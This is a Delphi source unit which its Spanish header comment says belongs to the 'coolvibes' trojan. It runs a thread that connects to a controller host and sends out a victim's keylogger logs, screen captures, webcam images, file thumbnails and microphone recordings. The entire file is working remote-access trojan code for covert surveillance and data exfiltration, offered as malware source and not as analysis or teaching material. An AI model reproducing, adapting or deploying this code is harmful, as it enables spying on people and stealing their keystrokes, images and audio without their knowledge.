{Unit perteniciente al troyano coolvibes que se encarga de gestionar el envio de keylogger, thumbnails,captura de pantalla y de webcam}
unit UnitThreadsCapCamCapture;


interface


uses Windows, SysUtils, SocketUnit, UnitVariables, classes, unitCapScreen, unitfunciones, unitCamScreen, UnitAudio;

type
  TThreadCapCam = class(TThread)
  public
    Server:   TClientSocket;
    Host : string;
    port : string;
    SH : string;
    constructor Create(h,p,s:string);
    protected
    procedure Execute; override;
  end;
implementation


constructor TThreadCapCam.Create(h,p,s:string);
begin
  inherited Create(true);
  Host := h;
  Port := p;
  SH := S;
end;

procedure TThreadCapCam.Execute();
var
  Tempstr1, Tempstr2, tempstr, tempstr3, tempstr4, recibido, buffer: string;
  MS : TMemoryStream;
begin
  FreeOnTerminate := True;

  server := TClientSocket.Create;
  server.Connect(Host, strtoint(Port));    //conectamos

  while (server.Connected) do
  begin
    if pararcapturathread then break;
    sleep(1);  //Para no saturar la cpu

    if(CapturaKeylogger <> '') then
    begin
      server.SendString('SH|'+SH + #10); //nos identificamos
      server.SendString('KEYLOGGERLOG|'+inttostr(length(CapturaKeylogger)+1)+'|'+ #10); //enviamos log!
      server.SendString(CapturaKeylogger+#10);
      CapturaKeylogger := '';
    end
    else
    if(CapturaPantalla <> '') then
    begin
      Recibido := CapturaPantalla;
      TempStr1 := Copy(Recibido, 1, Pos('|', Recibido) - 1);//calidad
      Delete(Recibido, 1, Pos('|', Recibido));
      TempStr2 := Copy(Recibido, 1, Pos('|', Recibido) - 1); //alto
      Delete(Recibido, 1, Pos('|', Recibido));
      MS := TMemoryStream.create;   //MS de la captura de Pantalla
      MS.Position := 0;

      pantallazo(StrToInt(TempStr1),(strtoint(TempStr2) * anchurapantalla )div alturapantalla,strtoint(Tempstr2),GetDesktopWindow(),MS);

      MS.Position := 0;                 //De paso se manda también la anchura y la altura para poder simular clicks
      if server.Connected then
      begin
        server.SendString('SH|'+SH + #10); //nos identificamos
        server.SendString('CAPSCREEN|'+inttostr(AnchuraPantalla)+'¬'+inttostr(AlturaPantalla)+'|' + IntToStr(MS.size) + #10);  //mandamos el tamaño
      end;
      TempStr := '';
      SetLength(TempStr, ms.size);
      Ms.Read(TempStr[1], ms.size);
      MS.Free;
      MS := nil;
      server.SendString(Tempstr);    //GOGOGO
      Capturapantalla := '';
    end
    else
    if(CapturaWebcam <> '') then
    begin

      if server.Connected then
      begin
        server.SendString('SH|'+SH + #10); //nos identificamos
        server.SendString('CAPTURAWEBCAM|C|' + inttostr(length(CapturaWebcam)) + #10);  //mandamos el tamaño
        server.SendString(CapturaWebcam);    //GOGOGO
      end;
      Capturawebcam := '';
    end
    else
    if(CapturaThumb <> '') then
    begin
      Recibido := Trim(CapturaThumb); //filename|width|height|calidad|

      TempStr := copy(recibido, 1, Pos('|', recibido) - 1); //Filename
      Delete(Recibido, 1, pos('|', Recibido));
      TempStr1 := Copy(recibido, 1, pos('|', Recibido) - 1); //width
      Delete(Recibido, 1, pos('|', Recibido));
      TempStr2 := Copy(recibido, 1, pos('|', Recibido) - 1); //height
      Delete(Recibido, 1, pos('|', Recibido));
      TempStr3 := Copy(recibido, 1, pos('|', Recibido) - 1); //calidad
      Delete(Recibido, 1, pos('|', Recibido));
      MS := TMemoryStream.create;   //MS de la captura de Pantalla
      MS.Position := 0;
      if Generatethumb(Tempstr, strtoint(Tempstr1), strtoint(Tempstr2), strtoint(Tempstr3),MS) then
      begin
        MS.Position := 0;
        if server.Connected then
        begin
          server.SendString('SH|'+SH + #10); //nos identificamos
          server.SendString('THUMBNAIL|'+inttostr(MS.size)+#10);  //mandamos el tamaño
        end;
        TempStr := '';
        SetLength(TempStr, ms.size);
        Ms.Read(TempStr[1], ms.size);
        MS.Free;
        MS := nil;
        if server.Connected then
          server.SendString(Tempstr);    //GOGOGO
        CapturaThumb := '';
      end
      else
      begin   //Poco probable pero posible :p
        MS.Free;
        MS := nil;
        if server.Connected then
        begin
          server.SendString('SH|'+SH + #10); //nos identificamos
          server.SendString('THUMBNAIL|1'+#10);
          server.SendString('1');
        end;
        CapturaThumb := '';
      end;

    end
    else
    if(CapturaAudio<>'') then
    begin
      Recibido := Trim(CapturaAudio); //segundos|hz-canales-bits|dispositivo|

      TempStr := copy(recibido, 1, Pos('|', recibido) - 1); //segundos
      Delete(Recibido, 1, pos('|', Recibido));
      TempStr1 := Copy(recibido, 1, pos('|', Recibido) - 1); //calidad

      TempStr3 := Copy(TempStr1, 1, pos('-', TempStr1) - 1); //HZ
      Delete(TempStr1, 1, pos('-', TempStr1));
      TempStr4 := Copy(TempStr1, 1, pos('-', TempStr1) - 1); //Canales 1|2
      Delete(TempStr1, 1, pos('-', TempStr1));               //Tempstr1 = bits: 8|16;

      Delete(Recibido, 1, pos('|', Recibido));
      TempStr2 := Copy(recibido, 1, pos('|', Recibido) - 1); //dispositivo
      Delete(Recibido, 1, pos('|', Recibido));
      buffer := '';

      
      GrabaAudio(strtointdef(tempstr2,0){Dispositivo},
                 strtointdef(tempstr,1){Duracion en segundos},
                 strtointdef(tempstr3,11025),
                 strtointdef(tempstr1,8){bits},
                 strtointdef(tempstr4,1){mono|stereo},
                 buffer{buffer});
      if server.Connected then
      begin
        server.SendString('SH|'+SH + #10); //nos identificamos
        server.SendString('GETAUDIO|'+inttostr(length(buffer))+'|'+#10);
        server.SendString(buffer);
      end;
      TempStr := '';
      CapturaAudio := '';
    end;

  end;

  Pararcapturathread := true;
  exitthread(0); //nos hemos desconectado asi que salimos
end;

end.

